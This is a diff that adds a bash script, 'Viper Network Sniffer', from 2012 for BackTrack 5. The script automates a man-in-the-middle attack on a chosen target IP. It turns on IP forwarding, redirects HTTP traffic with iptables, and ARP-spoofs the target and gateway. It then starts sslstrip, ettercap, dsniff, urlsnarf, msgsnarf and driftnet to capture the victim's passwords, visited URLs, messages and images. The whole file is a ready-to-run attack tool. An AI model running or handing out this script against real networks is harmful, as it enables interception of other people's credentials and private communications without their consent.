@@ -1,0 +1,81 @@
+#!/bin/bash
+#(C)opyright ~ 2012 Reza Mansouri
+# securmind@Gmail.com
+#r-mansouri.ir
+#
+#Licence For BackTrack 5
+#With this script you can Sniff your network very easy 
+#sniffers:
+# urlsnarf => sniff target URL's
+# Driftnet => Sniff target Images
+# Dsniff   => sniff target passwords
+# msgsnarf => sniff target IM [messengers]
+# Ettercap => sniff target passwords
+# SSLStrip => sniff HTTP/SSL
+#
+#--------------#
+scriptname=$0
+targetip=$1
+#--------------#
+#    Settings "you can change this"
+export v_interface="eth0"    # interface name 
+export v_getway="192.168.1.1"    # getway IP address
+#--------------#
+export v_version="Version 1.0.1" # current version
+export xterm="xterm"
+#--------------#
+
+function v_start(){
+# Port Forwarding
+echo -e '\E[32m'"[+]Viper Network Sniffer Script"; tput sgr0
+echo -e '\E[32m'"[+]Coded By Bl4ck.Viper"; tput sgr0
+echo -e '\E[32m'"[+]TBH Security Center"; tput sgr0
+sleep 2
+echo -e '\E[32m'"[+]Setting Up ..."; tput sgr0
+$xterm -geometry 75x10+10+0 -T "[VNS] v.$v_version - Terminating Other Arpspoof Process" -e "killall arpspoof" & #kill all the arpspoof
+sleep 2
+$xterm -geometry 75x10+10+0 -T "[VNS] v.$v_version - Port Forwarding" -e "echo 1 > /proc/sys/net/ipv4/ip_forward" & #Ip Forwarding
+sleep 2
+$xterm -geometry 75x10+10+0 -T "[VNS] v.$v_version - Port Forwarding" -e "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000" & #setting up iptable
+echo -e '\E[32m'"[+]OK"; tput sgr0
+# Starting Sniffers ...
+echo -e '\E[33m'"[+]Starting MITM Attack"; tput sgr0
+sleep 1
+# step 1 : start MITM attack ...
+$xterm -geometry 75x8+10+120 -T "[VNS] v.$v_version - Starting The MITM Attack..." -e "arpspoof -i $v_interface -t $targetip $v_getway" & #Start the MITM
+sleep 3
+echo -e '\E[33m'"[+]Starting Sinffers ..."; tput sgr0
+$xterm -geometry 75x10+10+10 -T "[VNS] v.$v_version - Sniffing HTTP/SSL" -e "python /pentest/web/sslstrip/sslstrip.py -a -k -f" & # Sniff HTTP/SSL
+echo -e '\E[32m'"[+]SSLStrip Started."; tput sgr0
+sleep 2
+$xterm -geometry 75x10+10+10 -T "[VNS] v.$v_version - Sniffing Passwords [ettercap]" -e "ettercap -T -q -i $v_interface" & # Sniff target passwords
+sleep 2
+echo -e '\E[32m'"[+]Ettercap Started."; tput sgr0
+echo -e '\E[32m'"[+]Starting All Sniffers ..."; tput sgr0
+sleep 1
+$xterm -geometry 75x10+10+0 -T "[VNS] v.$v_version - Sniffing URL's ..." -e "urlsnarf -i $v_interface" & # Sniff target URL's
+sleep 1
+$xterm -geometry 75x10+10+155 -T "[VNS] v.$v_version - Sniffing Passwords [1] ..." -e "dsniff -i $v_interface" & # Sniff target passwords
+sleep 1
+$xterm -geometry 75x10+10+310 -T "[VNS] v.$v_version - Sniffing IM ..." -e "msgsnarf -i $v_interface" & # Sniff Target Messengers
+sleep 1
+$xterm -geometry 75x10+10+465 -T "[VNS] v.$v_version - Sniffing Images ..." -e "driftnet -i $v_interface" & # Sniff target Images
+sleep 1
+echo -e '\E[35m'"[+]All Sniffers Started ..."; tput sgr0
+}
+function v_help() {
+clear
+echo -e '\E[32m'"[>] Welcome To Viper Network Sniffer"; tput sgr0
+echo -e '\E[32m'"[>] Coded By Bl4ck.Viper"; tput sgr0
+echo -e '\E[32m'"[>] TBH Security Center"; tput sgr0
+echo ""
+echo -e '\E[32m'"[>] Usage :
+  ./vns.sh [TargetIP]"; tput sgr0
+echo -e '\E[35m'"[>] Notic :
+  Set Your Network Information In Source Code (Setting Section)"; tput sgr0
+}
+if [ "$targetip" ]; then
+v_start;
+else
+v_help;
+fi
